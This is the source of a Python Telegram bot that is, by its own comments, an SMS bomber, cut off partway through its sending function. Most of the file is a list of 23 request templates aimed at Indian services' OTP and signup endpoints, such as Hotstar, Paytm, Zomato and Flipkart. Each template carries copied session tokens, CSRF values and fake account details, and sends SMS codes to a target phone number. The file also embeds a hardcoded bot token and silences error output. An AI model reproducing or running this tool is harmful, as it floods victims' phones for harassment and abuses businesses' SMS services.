#!/usr/bin/env python
import os
import sys
import random
import time
import requests
import logging
import re
import json
import subprocess
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# Disable stderr
sys.stderr = open(os.devnull, 'w')

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Configuration ---
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8838617444:AAHUzG-DKVIalamCRc80-SjUT0cIR4_ZDKQ')
OWNER_ID = int(os.environ.get('OWNER_ID', '1987818347'))

# --- Colors (for terminal) ---
C_BOX = "\033[1;35m"
C_TITLE = "\033[1;37m"
C_LABEL = "\033[1;36m"
C_VALUE = "\033[1;32m"
C_WARN = "\033[1;33m"
C_RED = "\033[1;31m"
RESET = "\033[0m"

# --- Database ---
DB_FILE = 'users_db.json'

def load_db():
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'users': [], 'blocked': []}

def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f, indent=4)

def add_user(user_id):
    db = load_db()
    if str(user_id) not in db['users']:
        db['users'].append(str(user_id))
        save_db(db)
        return True
    return False

def block_user(user_id):
    db = load_db()
    if str(user_id) not in db['blocked']:
        db['blocked'].append(str(user_id))
        save_db(db)
        return True
    return False

def unblock_user(user_id):
    db = load_db()
    if str(user_id) in db['blocked']:
        db['blocked'].remove(str(user_id))
        save_db(db)
        return True
    return False

def is_user_blocked(user_id):
    db = load_db()
    return str(user_id) in db['blocked']

# --- SMS BOMBING APIS (EXACTLY LIKE TERMUX CODE) ---
def get_apis(target):
    apis = [
        # 1. Hotstar
        {
            'url': f'https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp',
            'method': 'PUT',
            'headers': {
                'Host': 'api.hotstar.com',
                'content-length': '51',
                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'x-hs-platform': 'PCTV',
                'x-country-code': 'IN',
                'x-hs-device-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                'hotstarauth': f'st={int(datetime.now().timestamp())}~exp={int(datetime.now().timestamp())+3600}~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d',
                'x-hs-appversion': '5.0.40',
                'x-request-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                'accept': '*/*',
                'origin': 'https://www.hotstar.com',
                'sec-fetch-site': 'same-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.hotstar.com/in/subscribe/sign-in',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"phone_number": target, "country_prefix": "91"}
        },
        # 2. AltBalaji
        {
            'url': 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN',
            'method': 'POST',
            'headers': {
                'Host': 'api.cloud.altbalaji.com',
                'Connection': 'keep-alive',
                'Content-Length': '86',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'X-API-KEY': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE',
                'Content-Type': 'application/json',
                'Origin': 'https://www.altbalaji.com',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.altbalaji.com/user-detail?pid=NTU%3D',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "phone_number": target,
                "country_code": "91",
                "platform": "web",
                "exp": int((datetime.now().timestamp() + 3600) * 1000)
            }
        },
        # 3. Voot
        {
            'url': 'https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser',
            'method': 'POST',
            'headers': {
                'Host': 'us-central1-vootdev.cloudfunctions.net',
                'content-length': '59',
                'accept': 'application/json, text/plain, */*',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://www.voot.com',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.voot.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"type": "mobile", "mobile": target, "countryCode": "+91"}
        },
        # 4. SonyLIV
        {
            'url': 'https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP',
            'method': 'POST',
            'headers': {
                'Host': 'apiv2.sonyliv.com',
                'content-length': '111',
                'device_id': '5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120',
                'security_token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJ11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'accept': 'application/json, text/plain, */*',
                'session_id': f'cc86326a51504133bacd3ce4f796e1cf-{int(datetime.now().timestamp()*1000)}',
                'x-via-device': 'true',
                'app_version': '3.1.20',
                'origin': 'https://www.sonyliv.com',
                'sec-fetch-site': 'same-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "mobileNumber": target,
                "channelPartnerID": "MSMIND",
                "country": "IN",
                "timestamp": datetime.now().isoformat()
            }
        },
        # 5. MedPlus
        {
            'url': 'https://mobile.medplusindia.com/mobilemvc/profile/register.mbl',
            'method': 'POST',
            'headers': {
                'Host': 'mobile.medplusindia.com',
                'content-length': '238',
                'accept': 'application/json, text/plain, */*',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.medplusmart.com',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': f'recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={target}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false'
        },
        # 6. Apollo247
        {
            'url': 'https://webapi.apollo247.com/',
            'method': 'POST',
            'headers': {
                'Host': 'webapi.apollo247.com',
                'Connection': 'keep-alive',
                'Content-Length': '292',
                'accept': '*/*',
                'Authorization': 'Bearer 3d1833da7020e0602165529446587434',
                'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'Origin': 'https://www.apollo247.com',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.apollo247.com/medicines?gclid=CjwKCAjwh7H7BRBBEiwAPXjadvKY3NSyNG-0yNkxp2qz2Jd5T0_zltNV3OnwoDFh3ECOsNImtyi1KxoCQY0QAvD_BwE',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "operationName": "Login",
                "variables": {"mobileNumber": f"+91{target}", "loginType": "PATIENT"},
                "query": "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n"
            }
        },
        # 7. Netmeds
        {
            'url': f'https://m.netmeds.com/mst/rest/v1/id/details/{target}',
            'method': 'GET',
            'headers': {
                'Host': 'm.netmeds.com',
                'accept': 'application/json, text/plain, */*',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://m.netmeds.com/customer/account/login',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {}
        },
        # 8. GetInstaCash
        {
            'url': 'https://getinstacash.in/sell/getData.php',
            'method': 'POST',
            'headers': {
                'Host': 'getinstacash.in',
                'Connection': 'keep-alive',
                'Content-Length': '30',
                'Accept': '*/*',
                'X-Requested-With': 'XMLHttpRequest',
                'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://getinstacash.in',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://getinstacash.in/sell/login',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': f"type=sendOTP&mobile={target}"
        },
        # 9. Grofers
        {
            'url': 'https://grofers.com/v2/accounts/',
            'method': 'POST',
            'headers': {
                'Host': 'grofers.com',
                'content-length': '21',
                'lon': '77.040489',
                'device_id': 'a11f656b-422e-4617-953b-c350d517467d',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'auth_key': '57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13',
                'app_client': 'consumer_web',
                'lat': '28.4465616',
                'content-type': 'application/x-www-form-urlencoded',
                'save-data': 'on',
                'accept': '*/*',
                'origin': 'https://grofers.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://grofers.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {'user_phone': target}
        },
        # 10. Snapdeal
        {
            'url': 'https://m.snapdeal.com/signupCompleteAjax',
            'method': 'POST',
            'headers': {
                'Host': 'm.snapdeal.com',
                'content-length': '135',
                'xc': 'eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19',
                'h2': 'true',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'xg': 'eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'u': '160081122259159083',
                'save-data': 'on',
                'us': '',
                'accept': '*/*',
                'origin': 'https://m.snapdeal.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://m.snapdeal.com/signin',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': f'j_password=null&j_mobilenumber={target}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy'
        },
        # 11. Dream11
        {
            'url': 'https://www.dream11.com/graphql/mutation/pwa/register',
            'method': 'POST',
            'headers': {
                'Host': 'www.dream11.com',
                'content-length': '316',
                'accept': '*/*',
                'device': 'pwa',
                'x-csrf': 'fb1f1947-4547-392d-9a28-a9de30d9e766',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'origin': 'https://www.dream11.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.dream11.com/register?ru=',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
                "variables": {
                    "email": f"user{random.randint(1000,9999)}@gmail.com",
                    "mobileNumber": target,
                    "password": "tsunami@123astronomia"
                }
            }
        },
        # 12. Doubtnut
        {
            'url': 'https://doubtnut.com/api/v1/user/login',
            'method': 'POST',
            'headers': {
                'Host': 'doubtnut.com',
                'content-length': '16',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'origin': 'https://doubtnut.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://doubtnut.com/login',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': f'phone={target}'
        },
        # 13. Vedantu
        {
            'url': 'https://user.vedantu.com/user/preLoginVerification',
            'method': 'POST',
            'headers': {
                'Host': 'user.vedantu.com',
                'content-length': '74',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'accept': '*/*',
                'origin': 'https://www.vedantu.com',
                'sec-fetch-site': 'same-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.vedantu.com/masterclass?utm_source=in&utm_medium=in_ggl_cpa&utm_campaign=ggl_Brand_Search&utm_term=ggl_Brand_Search_Exact_Brand_Vedantu&utm_content=in_Brand_Search_Exact_Brand_Vedantu_Ad2&gclsrc=aw.ds&&gclid=CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "email": None,
                "phoneCode": "+91",
                "phoneNumber": target,
                "ver": "11.345"
            }
        },
        # 14. Unacademy
        {
            'url': 'https://unacademy.com/api/v3/user/user_check/',
            'method': 'POST',
            'headers': {
                'Host': 'unacademy.com',
                'content-length': '107',
                'accept': '*/*',
                'authorization': 'Bearer undefined',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'origin': 'https://unacademy.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://unacademy.com/login',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "phone": target,
                "country_code": "IN",
                "otp_type": 1,
                "email": "",
                "send_otp": True,
                "is_un_teach_user": False
            }
        },
        # 15. Byjus
        {
            'url': 'https://bcas-prod.byjusweb.com/api/send-otp',
            'method': 'POST',
            'headers': {
                'Host': 'bcas-prod.byjusweb.com',
                'content-length': '46',
                'accept': '*/*',
                'origin': 'https://byjus.com',
                'user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
                'content-type': 'application/x-www-form-urlencoded',
                'referer': 'https://byjus.com/byjus-classes-book-a-free-demo-class/registration/?utm_source=google&utm_mode=CPA&utm_campaign=K12-Brand-Android-BYJU%27S-India-Apr10&utm_term=byjus&gclid=EAIaIQobChMIzKCzs5396wIVVqqWCh0TgQO4EAAYASAAEgK-V_D_BwE',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'en-US'
            },
            'data': f'phoneNumber={target}&page=free-trial-classes'
        },
        # 16. RedBus
        {
            'url': f'https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined',
            'method': 'GET',
            'headers': {
                'Host': 'm.redbus.in',
                'accept': 'application/json, text/plain, */*',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://m.redbus.in/preregister',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {}
        },
        # 17. Oyo Rooms
        {
            'url': 'https://www.oyorooms.com/api/pwa/generateotp?locale=en',
            'method': 'POST',
            'headers': {
                'Host': 'www.oyorooms.com',
                'content-length': '51',
                'xsrf-token': 'vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'text/plain;charset=UTF-8',
                'accept': '*/*',
                'origin': 'https://www.oyorooms.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.oyorooms.com/login',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"phone": target, "country_code": "+91", "nod": 4}
        },
        # 18. Zomato
        {
            'url': 'https://www.zomato.com/webroutes/auth/login',
            'method': 'POST',
            'headers': {
                'Host': 'www.zomato.com',
                'content-length': '80',
                'x-zomato-csrft': 'a6b0c09972b2bdd30c9c1b6552caee5d',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'accept': '*/*',
                'origin': 'https://www.zomato.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.zomato.com/kanpur',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"country_id": 1, "phone": target, "verification_type": "sms", "method": "phone"}
        },
        # 19. Swiggy
        {
            'url': 'https://www.swiggy.com/mapi/auth/signup',
            'method': 'POST',
            'headers': {
                'Host': 'www.swiggy.com',
                'content-length': '172',
                'origin': 'https://www.swiggy.com',
                '__fetch_req__': 'true',
                'user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
                'content-type': 'application/json',
                'accept': '*/*',
                'referer': 'https://www.swiggy.com/auth/register',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'en-US'
            },
            'data': {
                "name": f"User{random.randint(1000,9999)}",
                "email": f"user{random.randint(1000,9999)}@gmail.com",
                "password": "Test@123456",
                "mobile": target,
            }
        },
        # 20. Paytm
        {
            'url': 'https://accounts.paytm.com/v2/api/register',
            'method': 'POST',
            'headers': {
                'Host': 'accounts.paytm.com',
                'Connection': 'keep-alive',
                'Content-Length': '286',
                'Accept': 'application/json, text/plain, */*',
                'Origin': 'https://accounts.paytm.com',
                'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
                'Content-Type': 'application/json',
                'Referer': 'https://accounts.paytm.com/oauth2/authorize?theme=mp-html5&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US'
            },
            'data': {
                "mobile": target,
                "email": f"user{random.randint(1000,9999)}@gmail.com",
                "scope": "paytm",
                "clientId": "paytm-web-secure",
                "loginPassword": "Test@123456",
            }
        },
        # 21. BookMyShow
        {
            'url': 'https://in.bookmyshow.com/pwa/api/uapi/otp/send',
            'method': 'POST',
            'headers': {
                'Host': 'in.bookmyshow.com',
                'content-length': '108',
                'accept': 'application/json',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'origin': 'https://in.bookmyshow.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': f'https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber={target}',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "channel": "phone",
                "subChannel": "sms",
                "details": {"phone": target, "origin": "https://in.bookmyshow.com"}
            }
        },
        # 22. BigBasket
        {
            'url': 'https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/',
            'method': 'POST',
            'headers': {
                'Host': 'www.bigbasket.com',
                'content-length': '27',
                'accept': 'application/json',
                'x-csrftoken': 'gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'x-channel': 'BB-PWA',
                'content-type': 'application/json',
                'origin': 'https://www.bigbasket.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.bigbasket.com/auth/login/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"identifier": target}
        },
        # 23. Flipkart
        {
            'url': 'https://1.rome.api.flipkart.com/1/action/view',
            'method': 'POST',
            'headers': {
                'Host': '1.rome.api.flipkart.com',
                'Connection': 'keep-alive',
                'Content-Length': '338',
                'x-user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile',
                'Origin': 'https://www.flipkart.com',
                'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
                'content-type': 'application/json',
                'Accept': '*/*',
                'Referer': 'https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US'
            },
            'data': {
                "actionRequestContext": {
                    "type": "LOGIN_IDENTITY_VERIFY",
                    "loginIdPrefix": "+91",
                    "loginId": target,
                    "loginType": "MOBILE",
                    "verificationType": "OTP",
                    "screenName": "LOGIN_V4_MOBILE",
                }
            }
        }
    ]
    return apis

def send_sms(api_data):
    """Send SMS using API - EXACTLY LIKE TERMUX"""
    try:
        if api_data['method'] == 'GET':
            response = requests.get(
                api_data['url'], 
                headers=api_data['headers'], 
                timeout=15
            )
        else:
            if isinstance(api_data['data'], dict):
                response = requests.request(
                    method=api_data['method'],
                    url=api_data['url'],
